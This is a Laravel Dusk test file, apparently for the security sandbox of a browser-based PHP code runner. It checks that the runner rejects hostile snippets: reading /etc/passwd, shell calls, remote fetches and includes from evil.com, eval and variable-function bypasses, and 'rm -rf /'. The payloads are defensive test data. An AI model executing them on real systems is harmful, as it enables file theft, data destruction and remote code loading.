<?php

use Laravel\Dusk\Browser;
use Tests\Browser\Pages\PhpRunnerPage;

beforeEach(function () {
    // 清理浏览器状态
    $this->browse(function (Browser $browser) {
        $browser->driver->manage()->deleteAllCookies();
    });
});

test('blocks dangerous file system functions', function () {
    $dangerousCodes = [
        '<?php file_get_contents("/etc/passwd"); ?>',
        '<?php fopen("/etc/passwd", "r"); ?>',
        '<?php readfile("/etc/passwd"); ?>',
        '<?php file("/etc/passwd"); ?>',
        '<?php glob("/etc/*"); ?>',
        '<?php scandir("/etc"); ?>',
        '<?php opendir("/etc"); ?>',
        '<?php is_file("/etc/passwd"); ?>',
        '<?php file_exists("/etc/passwd"); ?>',
        '<?php realpath("/etc/passwd"); ?>',
    ];

    $this->browse(function (Browser $browser) use ($dangerousCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($dangerousCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, false, '不允许使用函数')
                    ->screenshot("php-runner-security-file-{$index}");
        }
    });
});

test('blocks dangerous system execution functions', function () {
    $dangerousCodes = [
        '<?php exec("ls -la"); ?>',
        '<?php system("whoami"); ?>',
        '<?php shell_exec("pwd"); ?>',
        '<?php passthru("id"); ?>',
        '<?php `ls -la`; ?>',
        '<?php proc_open("ls", [], $pipes); ?>',
        '<?php popen("ls", "r"); ?>',
    ];

    $this->browse(function (Browser $browser) use ($dangerousCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($dangerousCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, false, '不允许使用函数')
                    ->screenshot("php-runner-security-exec-{$index}");
        }
    });
});

test('blocks dangerous network functions', function () {
    $dangerousCodes = [
        '<?php file_get_contents("http://evil.com"); ?>',
        '<?php fopen("http://evil.com", "r"); ?>',
        '<?php curl_init("http://evil.com"); ?>',
        '<?php fsockopen("evil.com", 80); ?>',
        '<?php socket_create(AF_INET, SOCK_STREAM, SOL_TCP); ?>',
        '<?php stream_socket_client("tcp://evil.com:80"); ?>',
    ];

    $this->browse(function (Browser $browser) use ($dangerousCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($dangerousCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, false, '不允许使用函数')
                    ->screenshot("php-runner-security-network-{$index}");
        }
    });
});

test('blocks dangerous reflection and eval functions', function () {
    $dangerousCodes = [
        '<?php eval("echo \'dangerous\';"); ?>',
        '<?php assert("1==1"); ?>',
        '<?php create_function("", "echo \'test\';"); ?>',
        '<?php call_user_func("system", "ls"); ?>',
        '<?php call_user_func_array("exec", ["ls"]); ?>',
        '<?php $func = "system"; $func("ls"); ?>',
        '<?php ReflectionFunction("system"); ?>',
    ];

    $this->browse(function (Browser $browser) use ($dangerousCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($dangerousCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, false, '不允许使用函数')
                    ->screenshot("php-runner-security-eval-{$index}");
        }
    });
});

test('blocks dangerous class instantiation', function () {
    $dangerousCodes = [
        '<?php new ReflectionClass("system"); ?>',
        '<?php new DirectoryIterator("/etc"); ?>',
        '<?php new SplFileObject("/etc/passwd"); ?>',
        '<?php new RecursiveDirectoryIterator("/etc"); ?>',
        '<?php new FilesystemIterator("/etc"); ?>',
    ];

    $this->browse(function (Browser $browser) use ($dangerousCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($dangerousCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, false, '不允许使用类')
                    ->screenshot("php-runner-security-class-{$index}");
        }
    });
});

test('allows safe php functions and operations', function () {
    $safeCodes = [
        '<?php echo "Hello World"; ?>',
        '<?php $arr = [1, 2, 3]; print_r($arr); ?>',
        '<?php for($i = 0; $i < 5; $i++) { echo $i; } ?>',
        '<?php function test() { return "safe"; } echo test(); ?>',
        '<?php class SafeClass { public $prop = "safe"; } $obj = new SafeClass(); echo $obj->prop; ?>',
        '<?php $json = json_encode(["key" => "value"]); echo $json; ?>',
        '<?php $str = "test"; echo strtoupper($str); ?>',
        '<?php $num = 42; echo number_format($num, 2); ?>',
    ];

    $this->browse(function (Browser $browser) use ($safeCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($safeCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, true)
                    ->screenshot("php-runner-security-safe-{$index}");
        }
    });
});

test('enforces execution time limits', function () {
    $this->browse(function (Browser $browser) {
        $infiniteLoopCode = '<?php
set_time_limit(0);
while(true) {
    echo "infinite loop";
}
?>';

        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser)
                ->typeCode($browser, $infiniteLoopCode)
                ->runCode($browser, 15)
                ->assertExecutionError($browser, '执行超时')
                ->screenshot('php-runner-security-timeout');
    });
});

test('enforces memory usage limits', function () {
    $this->browse(function (Browser $browser) {
        $memoryHogCode = '<?php
$data = [];
for ($i = 0; $i < 1000000; $i++) {
    $data[] = str_repeat("x", 1000);
}
echo "Memory consumed";
?>';

        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser)
                ->typeCode($browser, $memoryHogCode)
                ->runCode($browser, 15)
                ->assertExecutionError($browser, '内存超限')
                ->screenshot('php-runner-security-memory');
    });
});

test('sanitizes output to prevent xss', function () {
    $this->browse(function (Browser $browser) {
        $xssCode = '<?php echo "<script>alert(\'XSS\')</script>"; ?>';

        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser)
                ->executeCodeScenario($browser, $xssCode, '&lt;script&gt;alert(\'XSS\')&lt;/script&gt;')
                ->assertOutputNotContains($browser, '<script>')
                ->screenshot('php-runner-security-xss');
    });
});

test('blocks include and require statements', function () {
    $dangerousCodes = [
        '<?php include "/etc/passwd"; ?>',
        '<?php require "/etc/passwd"; ?>',
        '<?php include_once "/etc/passwd"; ?>',
        '<?php require_once "/etc/passwd"; ?>',
        '<?php include "http://evil.com/malicious.php"; ?>',
        '<?php require "data://text/plain;base64,PD9waHAgZWNobyAidGVzdCI7ID8+"; ?>',
    ];

    $this->browse(function (Browser $browser) use ($dangerousCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($dangerousCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, false, '不允许使用')
                    ->screenshot("php-runner-security-include-{$index}");
        }
    });
});

test('blocks variable function calls', function () {
    $dangerousCodes = [
        '<?php $func = "system"; $func("ls"); ?>',
        '<?php $cmd = "exec"; $cmd("whoami"); ?>',
        '<?php $$var = "system"; $$var("ls"); ?>',
        '<?php ${"func"} = "system"; ${"func"}("ls"); ?>',
    ];

    $this->browse(function (Browser $browser) use ($dangerousCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($dangerousCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, false, '不允许使用变量函数')
                    ->screenshot("php-runner-security-varfunc-{$index}");
        }
    });
});

test('blocks superglobal access to sensitive data', function () {
    $dangerousCodes = [
        '<?php print_r($_SERVER); ?>',
        '<?php echo $_ENV["PATH"]; ?>',
        '<?php var_dump($GLOBALS); ?>',
        '<?php echo $_SERVER["HTTP_HOST"]; ?>',
    ];

    $this->browse(function (Browser $browser) use ($dangerousCodes) {
        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($dangerousCodes as $index => $code) {
            $browser->validateCodeScenario($browser, $code, false, '不允许访问超全局变量')
                    ->screenshot("php-runner-security-superglobal-{$index}");
        }
    });
});

test('security validation is performed before execution', function () {
    $this->browse(function (Browser $browser) {
        $dangerousCode = '<?php system("rm -rf /"); ?>';

        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser)
                ->typeCode($browser, $dangerousCode)
                ->click('@run-button')
                ->waitFor('.security-warning', 5)
                ->assertSee('安全检查失败')
                ->assertSee('代码包含不安全的操作')
                ->assertMissing('@output-content')
                ->screenshot('php-runner-security-precheck');
    });
});

test('security bypass attempts are logged', function () {
    $this->browse(function (Browser $browser) {
        $bypassAttempts = [
            '<?php $f="sy"."stem"; $f("ls"); ?>',
            '<?php ${"GLOBALS"}["system"]("ls"); ?>',
            '<?php chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); ?>',
        ];

        $browser->visit(new PhpRunnerPage)
                ->waitForPhpReady($browser);

        foreach ($bypassAttempts as $code) {
            $browser->validateCodeScenario($browser, $code, false)
                    ->pause(1000); // Allow time for logging
        }

        // 验证日志记录（通过检查网络请求）
        $logs = $browser->driver->manage()->getLog('browser');
        $hasSecurityLog = false;
        foreach ($logs as $log) {
            if (str_contains($log['message'], 'security-violation')) {
                $hasSecurityLog = true;
                break;
            }
        }
        
        expect($hasSecurityLog)->toBeTrue();
    });
});
